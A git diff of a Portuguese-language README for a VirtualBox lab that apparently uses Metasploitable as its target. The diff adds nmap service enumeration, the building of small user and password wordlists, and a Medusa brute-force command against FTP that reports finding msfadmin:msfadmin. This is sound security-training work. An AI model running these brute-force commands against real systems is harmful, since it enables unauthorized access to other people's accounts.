@@ -23,5 +23,18 @@ O laboratório foi montado utilizando o **Oracle VirtualBox** em uma rede isolad
 ### 1. Mapeamento e Reconhecimento
 Antes de iniciar os testes de força bruta, foi realizada a enumeração de serviços ativos no alvo utilizando o `nmap`:
 
+echo -e "msfadmin\nuser\nadmin\nroot" > users.txt
+echo -e "123456\nmsfadmin\npassword\nadmin" > passwords.txt
+
 ```bash
 nmap -sV -p 21,139,445 192.168.56.102
+````
+Cenário 1: Ataque Brute Force no Serviço FTP (Porta 21)
+Foi utilizado o Medusa com dicionários personalizados de usuários (users.txt) e senhas (passwords.txt):
+
+Bash
+medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
+Resultado: Credencial válida encontrada com sucesso (msfadmin:msfadmin).
+
+<img width="698" height="531" alt="medusa" src="https://github.com/user-attachments/assets/a429aa74-412c-4998-9e2a-25dd92f1b4e1" />
+
